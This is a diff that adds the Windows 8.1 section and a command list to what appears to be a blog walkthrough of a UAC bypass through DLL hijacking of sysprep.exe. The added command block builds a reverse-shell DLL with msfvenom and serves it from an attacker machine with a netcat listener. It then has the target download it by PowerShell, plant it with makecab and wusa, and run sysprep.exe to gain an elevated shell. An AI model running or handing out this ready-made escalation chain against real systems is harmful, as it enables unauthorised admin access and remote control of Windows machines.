@@ -34,3 +34,38 @@ Let's run sysprep.exe and listen with 'nc':
 Now we have bypassed the UAC and we can create a new user!
 <img src="{{ site.url }}{{ site.baseurl }}/images/uacbypass8.png" alt="">
 <img src="{{ site.url }}{{ site.baseurl }}/images/uacbypass9.png" alt="">
+
+**Target 2: Windows 8.1 x64 build 6.3.9600**
+
+This time we have to do the same tasks but rename the dll differently:
+<img src="{{ site.url }}{{ site.baseurl }}/images/uacbypass10.png" alt="">
+
+Once downloaded to the target machine and used wusa for copying into sysprep, We can launch sysprep.exe:
+<img src="{{ site.url }}{{ site.baseurl }}/images/uacbypass11.png" alt="">
+
+And here you're done!
+
+For further information, look at the resources, there are other methods to bypass the UAC.
+Have fun :)
+
+**Commands:**
+**Kali**
+```console
+>msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=53 -f dll -o CRYPTBASE.dll
+>cp CRYPTBASE.dll /var/www
+>service apache2 start
+>nc -vlp 53
+```
+
+**Windows 7**
+```console
+>powershell.exe -Command (new-object System.Net.WebClient).DownloadFile('http://10.1.1.3/CRYPTBASE.dll','dest path CRYPTBASE.dll')
+>makecab "source path CRYPTBASE.dll" "dest path try.tmp"
+>wusa "source path try.tmp" /extract:"path to sysprep dir"
+>cd "path sysprep (c:->windows->system32->sysprep)"
+>sysprep.exe
+```
+
+**Resources:**
+1. [](https://github.com/hfiref0x/UACME)
+2. [](https://www.greyhathacker.net/?p=796)
